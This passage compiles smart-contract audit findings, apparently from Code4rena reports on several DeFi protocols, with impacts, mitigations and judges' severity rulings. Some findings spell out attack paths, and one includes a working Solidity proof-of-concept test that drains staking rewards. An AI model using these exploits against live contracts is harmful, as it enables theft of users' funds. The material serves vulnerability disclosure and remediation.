Another variant of exploiting this is to add liquidity in two steps: deposit 1 with 0 slip adjustment, perfectly matching current market price, deposit 2 with more Vader than market price suggests, moving pool out of balance with Vader becoming cheaper, then exiting deposit 1 with profit because slip adjustment reduce deposit 2's share issuance and deposit 1's now has more asset claims than before. Deposit 2 then need to wait and exit after some time.
IL is calculated as ((originalAsset * releasedVader) / releasedAsset) + originalVader - ((releasedAsset * releasedVader) / releasedAsset) + releasedVader, i.e. original deposit values without taking account of slip adjustment are used, so providing more Vader in deposit 2 leads to greater IL, which this way have 2 parts: market movements related and skewed liquidity provision related. IL covering compensates for slip adjustments this way.
Proof of Concept
The steps to reproduce are:

add asymmetric LP via mint (with NFT),
either swap gathering profit from pool skew or do symmetric deposit beforehand and exit it now
wait for some period for IL protection to be enabled, then withdraw, having IL covered by reserve fund

Router addLiquidity:
https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex-v2/router/VaderRouterV2.sol#L114
NFT mint:
https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex-v2/pool/BasePoolV2.sol#L168
Router removeLiquidity:
https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex-v2/router/VaderRouterV2.sol#L227
NFT burn:
https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex-v2/pool/VaderPoolV2.sol#L237
IL calculation:
https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex/math/VaderMath.sol#L73
Recommended Mitigation Steps
Asymmetric liquidity provision doesn't provide much business value, introducing substantial attack surface, so the core recommendation here is to remove a possibility to add liquidity asymmetrically: instead of penalizing LP with slip adjustment do biggest liquidity addition with 0 slip adjustment that user provided funds allow, and return the remaining part.
This will also guard against cases when user added liquidity with big slip adjustment penalty without malicious intent, not realizing that this penalty will take place, an effect that poses reputational risk to any project using the approach.
Allowing only symmetric liquidity addition removes the described attack surface.
SamSteinGG (Vader) marked as duplicate
alcueca (judge) commented:

Duplicate of which other issue, @SamSteinGG?



## [H-01]  "Copy your own portfolio to keep earning royalties"

Submitted by jayjonah8
Impact
In NestedFactory.sol going through the create() function which leads to the sendFeesWithRoyalties() => addShares() function,  Im not seeing any checks preventing someone from copying their own portfolio and receiving royalty shares for it and simply repeating the process over and over again.
Proof of Concept

FeeSplitter.sol L152
FeeSplitter.sol L220
NestedFactory.sol L103
NestedAsset.sol L69
NestedFactory.sol L103
NestedFactory.sol L491

Tools Used
Manual code review
Recommended Mitigation Steps
A require statement should be added not allowing users to copy their own portfolios.
maximebrugel (Nested) disagreed with severity:

Indeed, a user can copy his own portfolio to reduce the fees, however a require statement won't fix this issue...
This problem cannot be corrected but only mitigated, since the user can use two different wallets.
Currently the front-end doesn't allow to duplicate a portfolio with the same address.
I don't consider this a "High Risk" since the assets are not really stolen. Maybe "Med Risk" ? This is by design an issue and we tolerate that users can do this (with multiple wallets).


alcueca (judge) commented:

I'm reading that the vulnerability actually lowers fees to zero for a dedicated attacker, since creating a arbitrarily large number of wallets and bypassing the frontend is easy. In theory leaking protocol value would be a severity 2, but since this is effectively disabling a core feature of the protocol (fees), the severity 3 is sustained.

Medium Risk Findings (8)


## [H-01]  "MEV miner can mint larger than expected UDT total supply"

Submitted by elprofesor
UnlockProtocol attempts to calculate gas reimbursement using tx.gasprice, typically users who falsify tx.gaspricewould lose gas to miners and therefore not obtain any advantage over the protocol itself. This does present capabilities for miners to extract value, as they can submit their own transactions, or cooperate with a malicious user, reimbursing a portion (or all) or the tx.gasprice used. As the following calculation is made;
    uint tokensToDistribute = (estimatedGasForPurchase * tx.gasprice) * (125 * 10 ** 18) / 100 / udtPrice;

we can see that arbitrary tx.gasprices can rapidly inflate the tokensToDistribute. Though capped at maxTokens, this value can be up to half the total supply of UDT, which could dramatically affect the value of UDT potentially leading to lucrative value extractions outside of the pool.
Recommended Mitigation Steps
Using an oracle service to determine the average gas price and ensuring it is within some normal bounds that has not been subjected to arbitrary value manipulation.
julien51 (Unlock Protocol) disputed and commented:


we can see that arbitrary tx.gasprices can rapidly inflate the tokensToDistribute. Though capped at maxTokens, this value can be up to half the total supply of UDT, which could dramatically affect the value of UDT potentially leading to lucrative value extractions outside of the pool.

As you noted it would be capped by the actual increase of the GDP transaction.
However we could indeed use an oracle to determine the average gas price over a certain number of blocks to limit the risk even further. 

0xleastwood (judge) commented:

I think the warden has raised a valid issue of value extractions. Whether the value extracted is capped at a certain number of tokens, I don't think the issue is nullified as a result. Miners can realistically fill up blockspace by abusing this behaviour and then selling netted tokens on the open market. I'll consider marking this as medium, what do you think @julien51 ?

0xleastwood (judge) commented:

I think maxTokens will be set to IMintableERC20(udt).totalSupply() / 2 upon the first call to recordKeyPurchase(). If I'm not mistaken, this could allow a malicious miner could effectively distribute half of the token supply in one tx.

0xleastwood (judge) commented:

After further offline discussions with @julien51. We agree that this is an issue that needs to be addressed.
If we consider real-world values for IMintableERC20(udt).totalSupply() and IMintableERC20(udt).totalSupply() as 1_000_000e18 and 400e18 respectively. Then a miner could mint up to ~1247 UDT tokens valued at \$USD 124,688 if they provide a single Ether as their purchase amount. Obviously this can be abused to generate a huge amount of profit for miners, so as this is a viable way to extract value from the protocol, I will be keeping this as high severity.



## [H-02]  "Unable to remove liquidity in Recovery Mode"

Submitted by gzeon
According to https://github.com/code-423n4/2021-11-malt#high-level-overview-of-the-malt-protocol

When the Malt price TWAP drops below a specified threshold (eg 2% below peg) then the protocol will revert any transaction that tries to remove Malt from the AMM pool (ie buying Malt or removing liquidity). Users wanting to remove liquidity can still do so via the UniswapHandler contract that is whitelisted in recovery mode.

However, in https://github.com/code-423n4/2021-11-malt/blob/c3a204a2c0f7c653c6c2dda9f4563fd1dc1cecf3/src/contracts/DexHandlers/UniswapHandler.sol#L236
liquidity removed is directly sent to msg.sender, which would revert if it is not whitelisted
https://github.com/code-423n4/2021-11-malt/blob/c3a204a2c0f7c653c6c2dda9f4563fd1dc1cecf3/src/contracts/PoolTransferVerification.sol#L53
Recommended Mitigation Steps
Liquidity should be removed to UniswapHandler contract, then the proceed is sent to msg.sender
0xScotch (sponsor) confirmed
Alex the Entreprenerd (judge) commented:

I believe this finding to be correct, because of the whitelisting on verifyTransfer, during recovery mode the removal of liquidity from UniSwapV2Pair will perform safeTransfers: https://github.com/Uniswap/v2-core/blob/4dd59067c76dea4a0e8e4bfdda41877a6b16dedc/contracts/UniswapV2Pair.sol#L148
This means that the _beforeTokenTransfer will be called which eventually will call verifyTransfer which, if the price is below peg will revert.
Transfering the funds to the whitelisted contract should avoid this issue.
I'd like to remind the sponsor that anyone could deploy similar swapping contracts (or different ones such as curve), so if a person is motivate enough, all the whitelisting could technically be sidestepped.
That said, given the condition of LPing on Uniswap, the check and the current system would make it impossible to withdraw funds.
Because this does indeed compromises the availability of funds (effectively requiring the admin to unstock them manually via Whitelisting each user), I agree with High Severity



## [H-02]  "withdrawTo Does Not Sync Before Checking A Position’s Margin Requirements"

Submitted by leastwood
Impact
The maintenanceInvariant modifier in Collateral aims to check if a user meets the margin requirements to withdraw collateral by checking its current and next maintenance. maintenanceInvariant inevitably calls AccountPosition.maintenance which uses the oracle's price to calculate the margin requirements for a given position. Hence, if the oracle has not synced in a long time, maintenanceInvariant may end up utilising an outdated price for a withdrawal. This may allow a user to withdraw collateral on an undercollaterized position.
Proof of Concept
https://github.com/code-423n4/2021-12-perennial/blob/main/protocol/contracts/collateral/Collateral.sol#L67-L76
```solidity
function withdrawTo(address account, IProduct product, UFixed18 amount)
notPaused
collateralInvariant(msg.sender, product)
maintenanceInvariant(msg.sender, product)
external {
    _products[product].debitAccount(msg.sender, amount);
    token.push(account, amount);
emit Withdrawal(msg.sender, product, amount);

}
<https://github.com/code-423n4/2021-12-perennial/blob/main/protocol/contracts/collateral/Collateral.sol#L233-L241>solidity
modifier maintenanceInvariant(address account, IProduct product) {
    _;
UFixed18 maintenance = product.maintenance(account);
UFixed18 maintenanceNext = product.maintenanceNext(account);

if (UFixed18Lib.max(maintenance, maintenanceNext).gt(collateral(account, product)))
    revert CollateralInsufficientCollateralError();

}
<https://github.com/code-423n4/2021-12-perennial/blob/main/protocol/contracts/product/types/position/AccountPosition.sol#L71-L75>solidity
function maintenanceInternal(Position memory position, IProductProvider provider) private view returns (UFixed18) {
    Fixed18 oraclePrice = provider.priceAtVersion(provider.currentVersion());
    UFixed18 notionalMax = Fixed18Lib.from(position.max()).mul(oraclePrice).abs();
    return notionalMax.mul(provider.maintenance());
}
```
Tools Used
Manual code review.
Recommended Mitigation Steps
Consider adding settleForAccount(msg.sender) to the Collateral.withdrawTo function to ensure the most up to date oracle price is used when assessing an account's margin requirements.
kbrizzle (Perennial) confirmed:

Great catch 🙏 

Alex the Entreprenerd (judge) commented:

With most onChain protocols where there is potential for undercollateralized positions and liquidations, it is very important to accrue a user position before making any changes to their balance.
The warden identified a potential way for a user to withdraw funds while their account is below margin requirements.
Because this impacts the core functionality functionality of the protocol (accounting), I'm raising the severity to high
Mitigation seems to be straightforward

Medium Risk Findings (3)


## [H-03]  "denial of service"

Submitted by certora
https://github.com/code-423n4/2021-12-sublime/blob/main/contracts/Pool/Pool.sol#L645
if the borrow token is address(0) (ether), and someone calls withdrawLiquidity, it calls SavingsAccountUtil.transferTokens which will transfer to msg.sender, msg.value (of withdrawLiquidity, because it's an internal function). In other words, the liquidity provided will pay to themselves and their liquidity tokens will still be burned. therefore they will never be able to get their funds back.
Recommended Mitigation Steps
the bug is in
https://github.com/code-423n4/2021-12-sublime/blob/main/contracts/SavingsAccount/SavingsAccountUtil.sol
It is wrong to use msg.value in transferTokens because it'll be the msg.value of the calling function.
therefore every transfer of ether using this function is wrong and dangerous, the solution is to remove all msg.value from this function and just transfer _amount regularly.
**ritik99 (Sublime) confirmed **


## [H-06]  "Creating rewardTokens without streaming depositTokens"

Submitted by bitbopper
Impact
stake and withdraws can generate rewardTokens without streaming depositTokens.
It does not matter whether the stream is a sale or not.
The following lines can increase the reward balance on a withdraw some time after stake:
https://github.com/code-423n4/2021-11-streaming/blob/main/Streaming/src/Locke.sol#L219:L222
// accumulate reward per token info
cumulativeRewardPerToken = rewardPerToken();

// update user rewards
ts.rewards = earned(ts, cumulativeRewardPerToken);

While the following line can be gamed in order to not stream any tokens (same withdraw tx).
Specifically an attacker can arrange to create a fraction less than zero thereby substracting zero.
https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L229
ts.tokens -= uint112(acctTimeDelta * ts.tokens / (endStream - ts.lastUpdate));
// WARDEN TRANSLATION: (elapsedSecondsSinceStake * stakeAmount) / (endStreamTimestamp - stakeTimestamp)

A succesful attack increases the share of rewardTokens of the attacker.
The attack can be repeated every block increasing the share further.
The attack could be done from multiple EOA increasing the share further.
In short: Attackers can create loss of funds for (honest) stakers.
The economic feasability of the attack depends on:

staked amount (times number of attacks) vs total staked amount
relative value of rewardToken to gasprice

Proof of Concept
code
The following was added to Locke.t.sol for the StreamTest Contract to simulate the attack from one EOA.
```solidity
function test_quickDepositAndWithdraw() public {
    //// SETUP
    // accounting (to proof attack): save the rewardBalance of alice.
    uint StartBalanceA = testTokenA.balanceOf(address(alice));
    uint112 stakeAmount = 10_000;
// start stream and fill it
(
    uint32 maxDepositLockDuration,
    uint32 maxRewardLockDuration,
    uint32 maxStreamDuration,
    uint32 minStreamDuration
) = defaultStreamFactory.streamParams();

uint64 nextStream = defaultStreamFactory.currStreamId();
Stream stream = defaultStreamFactory.createStream(
    address(testTokenA),
    address(testTokenB),
    uint32(block.timestamp + 10), 
    maxStreamDuration,
    maxDepositLockDuration,
    0,
    false
    // false,
    // bytes32(0)
);

testTokenA.approve(address(stream), type(uint256).max);
stream.fundStream(1_000_000_000);

// wait till the stream starts
hevm.warp(block.timestamp + 16);
hevm.roll(block.number + 1);

// just interact with contract to fill "lastUpdate" and "ts.lastUpdate"

// without changing balances inside of Streaming contract
    alice.doStake(stream, address(testTokenB), stakeAmount);
    alice.doWithdraw(stream, stakeAmount);
///// ATTACK COMES HERE
// stake
alice.doStake(stream, address(testTokenB), stakeAmount);

// wait a block
hevm.roll(block.number + 1);
hevm.warp(block.timestamp + 16);

// withdraw soon thereafter
alice.doWithdraw(stream, stakeAmount);

// finish the stream
hevm.roll(block.number + 9999);
hevm.warp(block.timestamp + maxDepositLockDuration);

// get reward
alice.doClaimReward(stream);


// accounting (to proof attack): save the rewardBalance of alice / save balance of stakeToken
uint EndBalanceA = testTokenA.balanceOf(address(alice));
uint EndBalanceB = testTokenB.balanceOf(address(alice));

// Stream returned everything we gave it
// (doStake sets balance of alice out of thin air => we compare end balance against our (thin air) balance)
assert(stakeAmount == EndBalanceB);

// we gained reward token without risk
assert(StartBalanceA == 0);
assert(StartBalanceA < EndBalanceA);
emit log_named_uint("alice gained", EndBalanceA);

}
```
commandline
```zsh
    dapp test --verbosity=2 --match "test_quickDepositAndWithdraw" 2> /dev/null
    Running 1 tests for src/test/Locke.t.sol:StreamTest
    [PASS] test_quickDepositAndWithdraw() (gas: 4501209)
Success: test_quickDepositAndWithdraw

  alice gained: 13227

```
Tools Used
dapptools
Recommended Mitigation Steps
Ensure staked tokens can not generate reward tokens without streaming deposit tokens. First idea that comes to mind is making following line
https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L220
dependable on a positive amount > 0 of:
https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L229
brockelmore (Streaming Protocol) confirmed


## [H-04]  "cancelPromotion is too rigorous"

Submitted by gpersoon, also found by 0x0x0x, gzeon, harleythedog, hubble, and kenzo
Impact
When you cancel a promotion with cancelPromotion() then the promotion is complete deleted.
This means no-one can claim any rewards anymore, because  \_promotions\[\_promotionId] no longer exists.
It also means all the unclaimed tokens (of the previous epochs) will stay locked in the contract.
Proof of Concept
https://github.com/pooltogether/v4-periphery/blob/b520faea26bcf60371012f6cb246aa149abd3c7d/contracts/TwabRewards.sol#L119-L138
```solidity
function cancelPromotion(uint256 _promotionId, address _to) ... {
    ...
    uint256 _remainingRewards = _getRemainingRewards(_promotion);
    delete _promotions[_promotionId];
```
Recommended Mitigation Steps
In the function cancelPromotion() lower the numberOfEpochs or set a state variable, to allow user to claim their rewards.
PierrickGT (PoolTogether) confirmed 


## [H-07]  "Contract does not work with fee-on transfer tokens"

Submitted by pmerkleplant, also found by GiveMeTestEther, WatchPug, and defsec
Impact
There exist ERC20 tokens that charge a fee for every transfer.
This kind of token does not work correctly with the TwabRewards contract as the
rewards calculation for an user is based on promotion.tokensPerEpoch (see line 320).
However, the actual amount of tokens the contract holds could be less than
promotion.tokensPerEpoch * promotion.numberOfEpochs leading to not claimable
rewards for users claiming later than others.
Recommended Mitigation Steps
To disable fee-on transfer tokens for the contract, add the following code in
createPromotion around line 11:
solidity
uint256 oldBalance = _token.balanceOf(address(this));
_token.safeTransferFrom(msg.sender, address(this), _tokensPerEpoch * _numberOfEpochs);
uint256 newBalance = _token.balanceOf(address(this));
require(oldBalance + _tokenPerEpoch * _numberOfEpochs == newBalance);
PierrickGT (PoolTogether) confirmed
LSDan (judge) commented:

This issue results in a direct loss of funds and can happen easily.
3 — High (H): vulns have a risk of 3 and are considered “High” severity when assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals).

Medium Risk Findings (5)


## [H-02]  "It might not be possible to withdraw tokens from the basket"

Submitted by Czar102, also found by csanuragjain
Impact
When enough basket token owners exit, it will be impossible to exit pool with the last MIN_AMOUNT tokens because of this check. This will result in locking some tokens forever.
Recommended Mitigation Steps
Consider resigning from this check or performing it only for the owner balance, who would need to have at least MIN_AMOUNT tokens.
loki-sama (Amun) disagreed with severity
0xleastwood (Judge) commented:

Nice find! I think this is valid:)

Medium Risk Findings (10)


## [H-03]  "A vault can be locked from MarketplaceZap and StakingZap"

Submitted by p4st13r4, also found by cmichel, GreyArt, hyh, jayjonah8, leastwood, pauliax, shenwilly, and WatchPug
Any user that owns a vToken of a particular vault can lock the functionalities of NFTXMarketplaceZap.sol and NFTXStakingZap.sol for everyone.
Every operation performed by the marketplace, that deals with vToken minting, performs this check:
jsx
require(balance == IERC20Upgradeable(vault).balanceOf(address(this)), "Did not receive expected balance");
A malicious user could transfer any amount > 0 of a vault’vToken to the marketplace (or staking) zap contracts, thus making the vault functionality unavailable for every user on the marketplace
Proof of Concept
https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L421
https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L421
Recommended Mitigation Steps
Remove this logic from the marketplace and staking zap contracts, and add it to the vaults (if necessary)
0xKiwi (NFTX) confirmed, but disagreed with high severity and commented:

Valid concern, confirmed. And disagreeing with severity.

0xKiwi (NFTX) resolved
LSDan (judge) commented:

In this case I agree with the warden's severity. The attack would cause user funds to be locked and is incredibly easy to perform.


Medium Risk Findings (17)


## [H-11]  "totalLiquidityWeight Is Updated When Adding New Token Pairs Which Skews Price Data For getVaderPrice and getUSDVPrice"

Submitted by leastwood
The _addVaderPair function is called by the onlyOwner role. The relevant data in the twapData mapping is set by querying the respective liquidity pool and Chainlink oracle. totalLiquidityWeight for the VADER path is also incremented by the pairLiquidityEvaluation amount (calculated within _addVaderPair). If a user then calls syncVaderPrice, the recently updated totalLiquidityWeight will be taken into consideration when iterating through all token pairs eligible for price updates to calculate the liquidity weight for each token pair. This data is stored in pastTotalLiquidityWeight and pastLiquidityWeights respectively.
As a result, newly added token pairs will increase pastTotalLiquidityWeight while leaving pastLiquidityWeights underrepresented. This only occurs if syncVaderPrice is called before the update period for the new token has not been passed.
This issue also affects how the price for USDV is synced.
Proof of Concept
https://github.com/code-423n4/2021-12-vader/blob/main/contracts/lbt/LiquidityBasedTWAP.sol#L299
function _addVaderPair(
    IUniswapV2Pair pair,
    IAggregatorV3 oracle,
    uint256 updatePeriod
) internal {
    require(
        updatePeriod != 0,
        "LBTWAP::addVaderPair: Incorrect Update Period"
    );

    require(oracle.decimals() == 8, "LBTWAP::addVaderPair: Non-USD Oracle");

    ExchangePair storage pairData = twapData[address(pair)];

    bool isFirst = pair.token0() == vader;

    (address nativeAsset, address foreignAsset) = isFirst
        ? (pair.token0(), pair.token1())
        : (pair.token1(), pair.token0());

    oracles[foreignAsset] = oracle;

    require(nativeAsset == vader, "LBTWAP::addVaderPair: Unsupported Pair");

    pairData.foreignAsset = foreignAsset;
    pairData.foreignUnit = uint96(
        10**uint256(IERC20Metadata(foreignAsset).decimals())
    );

    pairData.updatePeriod = updatePeriod;
    pairData.lastMeasurement = block.timestamp;

    pairData.nativeTokenPriceCumulative = isFirst
        ? pair.price0CumulativeLast()
        : pair.price1CumulativeLast();

    (uint256 reserve0, uint256 reserve1, ) = pair.getReserves();

    (uint256 reserveNative, uint256 reserveForeign) = isFirst
        ? (reserve0, reserve1)
        : (reserve1, reserve0);

    uint256 pairLiquidityEvaluation = (reserveNative *
        previousPrices[uint256(Paths.VADER)]) +
        (reserveForeign * getChainlinkPrice(foreignAsset));

    pairData.pastLiquidityEvaluation = pairLiquidityEvaluation;

    totalLiquidityWeight[uint256(Paths.VADER)] += pairLiquidityEvaluation;

    vaderPairs.push(pair);

    if (maxUpdateWindow < updatePeriod) maxUpdateWindow = updatePeriod;
}

https://github.com/code-423n4/2021-12-vader/blob/main/contracts/lbt/LiquidityBasedTWAP.sol#L113-L148
function syncVaderPrice()
    public
    override
    returns (
        uint256[] memory pastLiquidityWeights,
        uint256 pastTotalLiquidityWeight
    )
{
    uint256 _totalLiquidityWeight;
    uint256 totalPairs = vaderPairs.length;
    pastLiquidityWeights = new uint256[](totalPairs);
    pastTotalLiquidityWeight = totalLiquidityWeight[uint256(Paths.VADER)];

    for (uint256 i; i < totalPairs; ++i) {
        IUniswapV2Pair pair = vaderPairs[i];
        ExchangePair storage pairData = twapData[address(pair)];
        uint256 timeElapsed = block.timestamp - pairData.lastMeasurement;

        if (timeElapsed < pairData.updatePeriod) continue;

        uint256 pastLiquidityEvaluation = pairData.pastLiquidityEvaluation;
        uint256 currentLiquidityEvaluation = _updateVaderPrice(
            pair,
            pairData,
            timeElapsed
        );

        pastLiquidityWeights[i] = pastLiquidityEvaluation;

        pairData.pastLiquidityEvaluation = currentLiquidityEvaluation;

        _totalLiquidityWeight += currentLiquidityEvaluation;
    }

    totalLiquidityWeight[uint256(Paths.VADER)] = _totalLiquidityWeight;
}

As shown above, pastTotalLiquidityWeight = totalLiquidityWeight[uint256(Paths.VADER)] loads in the total liquidity weight which is updated when _addVaderPair is called. However, pastLiquidityWeights is calculated by iterating through each token pair that is eligible to be updated.
Recommended Mitigation Steps
Consider removing the line totalLiquidityWeight[uint256(Paths.VADER)] += pairLiquidityEvaluation; in _addVaderPair so that newly added tokens do not impact upcoming queries for VADER/USDV price data. This should ensure syncVaderPrice and syncUSDVPrice cannot be manipulated when adding new tokens.
SamSteinGG (Vader) confirmed



## [H-12]  "Using single total native reserve variable for synth and non-synth reserves of VaderPoolV2 can lead to losses for synth holders"

Submitted by hyh, also found by certora
Users that mint synths do provide native assets, increasing native reserve pool, but do not get any liquidity shares issued.
In the same time, an exit of non-synth liquidity provider yields releasing a proportion of all current reserves to him.
Whenever an exit of non-synth LP is substantial enough, the system will have much less native asset regarding the cumulative deposit of synth holders. That is, when a LP entered he provided a share of current reserves, both native and foreign, and got the corresponding liquidity shares in return. Suppose then big enough amounts of synths were minted, providing correspondingly big enough amount of native assets. If the LP now wants to exit, he will obtain a part of total native assets, including a part of the amount that was provided by synth minter. If the exit is big enough there will be substantially less native assets left to reimburse the synth minter than he initially provided. This is not reversible: the synth minters lost their native assets to LP that exited.
Proof of Concept
There are three types of mint/burn: NFT, fungible and synths. First two get LP shares, the latter gets synths. Whenever NFT or fungible LP exits, it gets a proportion of combined reserves. That is, some of native reserves were deposited by synth minters, but it is not accounted anyhow, only one total reserve number per asset is used.
Suppose the following scenario, Alice wants to provide liquidity, while Bob wants to mint synths:

Alice deposits both sides to a pool, 100 USDV and 100 foreign.
Bob deposit 100 USDV and mints some foreign Synth.
LP withdraws 95% of her liquidity shares. As she owns the pool liquidity, she gets 95% of USDV and foreign total reserves, 190 USDV and 95 foreign. Alice received almost all of her and Bob's USDV.
If Bob burn his synth and withdraw, he will get a tiny fraction of USDV he deposited (calculated by VaderMath.calculateSwap, we use its terms):

https://github.com/code-423n4/2021-12-vader/blob/main/contracts/dex/math/VaderMath.sol#L98
x = 100, X = 0.05 * 200 = 10, Y = 0.05 * 100 = 5.
Swap outcome, how much USDV will Bob get, is x * Y * X / (x + X) ^ 2 = 100 * 5 * 10 / (110^2) = 0.4 (rounded).
The issue is that synth provided and LP provided USDV aren't accounted separately, total reserves number if used everywhere instead:
Synth minters provide native asset, say USDV, to the system:
https://github.com/code-423n4/2021-12-vader/blob/main/contracts/dex-v2/pool/VaderPoolV2.sol#L187
Synth minters get synths and no LP shares, while to account for their deposit, the total USDV balance is increased:
https://github.com/code-423n4/2021-12-vader/blob/main/contracts/dex-v2/pool/VaderPoolV2.sol#L187
When LP enters, it gets liquidity shares proportionally to current reserves (NFT mint, notice the reserveNative, which is BasePoolV2's pair.reserveNative, total amount of native asset in the Pool):
https://github.com/code-423n4/2021-12-vader/blob/main/contracts/dex-v2/pool/BasePoolV2.sol#L497
When LP exits, it gets a proportion of current reserves back (NFT burn):
https://github.com/code-423n4/2021-12-vader/blob/main/contracts/dex-v2/pool/BasePoolV2.sol#L223
The same happens when fungible LP mints (same reserveNative):
https://github.com/code-423n4/2021-12-vader/blob/main/contracts/dex-v2/pool/VaderPoolV2.sol#L336
And burns:
https://github.com/code-423n4/2021-12-vader/blob/main/contracts/dex-v2/pool/VaderPoolV2.sol#L401
Recommended Mitigation Steps
Account for LP provided liquidity separately from total amount variables, i.e. use only LP provided native reserves variables in LP shares mint and burn calculations.
That should suffice as total amount of native assets is still to be used elsewhere, whenever the whole pool is concerned, for example, in rescue function, swap calculations and so forth.
SamSteinGG (Vader) acknowledged



## [H-13]  "Council veto protection does not work"

Submitted by TomFrenchBlockchain
Council can veto proposals to remove them to remain in power.
Proof of Concept
The Vader governance contract has the concept of a "council" which can unilaterally accept or reject a proposal. To prevent a malicious council preventing itself from being replaced by the token holders, the veto function checks the calldata for any proposal action directed at GovernorAlpha to see if it matches the changeCouncil function selector.
Note this is done by reading from the proposal.calldatas array.
https://github.com/code-423n4/2021-12-vader/blob/fd2787013608438beae361ce1bb6d9ffba466c45/contracts/governance/GovernorAlpha.sol#L568-L603
If we look at the structure of a proposal however we can see that the function selector is held (in the form of the signature) in the signatures array rather than being included in the calldata. The calldata array then holds just the function arguments for the call rather than specifying which function to call.
https://github.com/code-423n4/2021-12-vader/blob/fd2787013608438beae361ce1bb6d9ffba466c45/contracts/governance/GovernorAlpha.sol#L71-L72
https://github.com/code-423n4/2021-12-vader/blob/fd2787013608438beae361ce1bb6d9ffba466c45/contracts/governance/GovernorAlpha.sol#L356-L362
Indeed if we look at the TimeLock contract we see that the signature is hashed to calculate the function selector and is prepended onto the calldata.
https://github.com/code-423n4/2021-12-vader/blob/fd2787013608438beae361ce1bb6d9ffba466c45/contracts/governance/Timelock.sol#L292-L299
Looking at the function signature of the changeCouncil we can see that the value that the veto function will check against this.changeCouncil.signature will be the first 4 bytes of an abi encoded address and so will always be zero no matter what function is being called.
https://github.com/code-423n4/2021-12-vader/blob/fd2787013608438beae361ce1bb6d9ffba466c45/contracts/governance/GovernorAlpha.sol#L623
High risk as this issue gives the council absolute control over the DAO such that they cannot be removed.
Recommended Mitigation Steps
Hash the function signatures to calculate function selectors and then check those rather than the calldata.
This is something that should be picked up by a test suite however, I'd recommend writing tests to ensure that protections you add to the code have any affect and more broadly check that the code behaves as expected.
SamSteinGG (Vader) acknowledged



## [H-01]  "L1Migrator.sol#migrateETH() does not send bridgeMinter’s ETH to L2 causing ETH get frozen in the contract"

Submitted by WatchPug, also found by gzeon, harleythedog, and Ruhum.
Per the arb-bridge-eth code:

all msg.value will deposited to callValueRefundAddress on L2



https://github.com/OffchainLabs/arbitrum/blob/78118ba205854374ed280a27415cb62c37847f72/packages/arb-bridge-eth/contracts/bridge/Inbox.sol#L313


https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L1/gateway/L1ArbitrumMessenger.sol#L65-L74


solidity
uint256 seqNum = inbox.createRetryableTicket{value: _l1CallValue}(
    target,
    _l2CallValue,
    maxSubmissionCost,
    from,
    from,
    maxGas,
    gasPriceBid,
    data
);
At L308-L309, ETH held by BridgeMinter is withdrawn to L1Migrator:
https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L1/gateway/L1Migrator.sol#L308-L309
solidity
uint256 amount = IBridgeMinter(bridgeMinterAddr)
    .withdrawETHToL1Migrator();
However, when calling sendTxToL2() the parameter _l1CallValue is only the msg.value, therefore, the ETH transferred to L2 does not include any funds from bridgeMinter.
https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L1/gateway/L1Migrator.sol#L318-L327
solidity
sendTxToL2(
    l2MigratorAddr,
    address(this), // L2 alias of this contract will receive refunds
    msg.value,
    amount,
    _maxSubmissionCost,
    _maxGas,
    _gasPriceBid,
    ""
)
As a result, due to lack of funds, call with value = amount to l2MigratorAddr will always fail on L2.
Since there is no other way to send ETH to L2, all the ETH from bridgeMinter is now frozen in the contract.
Recommendation
Change to:
solidity
sendTxToL2(
    l2MigratorAddr,
    address(this), // L2 alias of this contract will receive refunds
    msg.value + amount, // the `amount` withdrawn from BridgeMinter should be added
    amount,
    _maxSubmissionCost,
    _maxGas,
    _gasPriceBid,
    ""
)
yondonfu (Livepeer) confirmed and resolved:

Fixed in https://github.com/livepeer/arbitrum-lpt-bridge/pull/51

0xleastwood (judge) commented:

Awesome find!

Medium Risk Findings (8)


## [H-03]  "Double transfer in the transferAndCall function of ERC677"

Submitted by shw, also found by cccz, danb, and wuwe1
The implementation of the transferAndCall function in ERC677 is incorrect. It transfers the _value amount of tokens twice instead of once. Since the Flan contract inherits ERC667, anyone calling the transferAndCall function on Flan is affected by this double-transfer bug.
Proof of Concept
Below is the implementation of transferAndCall:
solidity
function transferAndCall(
  address _to,
  uint256 _value,
  bytes memory _data
) public returns (bool success) {
  super.transfer(_to, _value);
  _transfer(msg.sender, _to, _value);
  if (isContract(_to)) {
      contractFallback(_to, _value, _data);
  }
  return true;
}
We can see that super.transfer(_to, _value); and _transfer(msg.sender, _to, _value); are doing the same thing - transfering _value of tokens from msg.sender to _to.
Referenced code:
ERC677/ERC677.sol#L28-L29
Recommended Mitigation Steps
Remove _transfer(msg.sender, _to, _value); in the transferAndCall function.
gititGoro (Behodler) confirmed and commented:

Fix
Behodler/limbo#3




## [H-06]  "ConvexStakingWrapper.sol#_calcRewardIntegral Wrong implementation can disrupt rewards calculation and distribution"

Submitted by WatchPug, also found by cmichel, harleythedog, hickuphh3, kirk-baird, and leastwood
ConvexStakingWrapper.sol#L175-L204
```solidity
    uint256 bal = IERC20(reward.token).balanceOf(address(this));
    uint256 d_reward = bal - reward.remaining;
    // send 20 % of cvx / crv reward to treasury
    if (reward.token == cvx || reward.token == crv) {
        IERC20(reward.token).transfer(treasury, d_reward / 5);
        d_reward = (d_reward * 4) / 5;
    }
    IERC20(reward.token).transfer(address(claimContract), d_reward);
if (_supply > 0 && d_reward > 0) {
    reward.integral =
        reward.integral +
        uint128((d_reward * 1e20) / _supply);
}

//update user integrals
